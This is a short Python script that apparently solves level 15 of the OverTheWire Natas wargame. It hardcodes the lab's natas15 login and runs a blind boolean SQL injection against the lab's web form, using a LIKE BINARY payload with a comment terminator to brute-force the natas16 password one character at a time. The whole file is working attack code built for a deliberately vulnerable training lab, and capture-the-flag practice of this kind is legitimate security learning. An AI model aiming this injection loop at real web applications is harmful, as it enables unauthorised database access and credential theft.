```
#!/usr/bin/env python
import requests
from string import ascii_lowercase, ascii_uppercase, digits

characters = ascii_lowercase + ascii_uppercase + digits
print(characters)

username = 'natas15'
password = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

seen_password = []

while True:
    for ch in characters:
        # Construct the SQL injection payload
        payload = {
            "username": 'natas16" AND password LIKE BINARY "' + "".join(seen_password) + ch + '%" # '
        }
        
        response = session.post(url, data=payload, auth=(username, password))
        
        # Check if the response indicates a successful SQL injection (e.g., different behavior or error message)
        if "This user exists." in response.text:
            seen_password.append(ch)
            print("Found character:", "".join(seen_password))
            break

    # Check if we have found the entire password
    if len(seen_password) == 32:  # Assuming password length is 32 characters
        break

# Once the loop ends, print the final password
print("Final password:", "".join(seen_password))
```
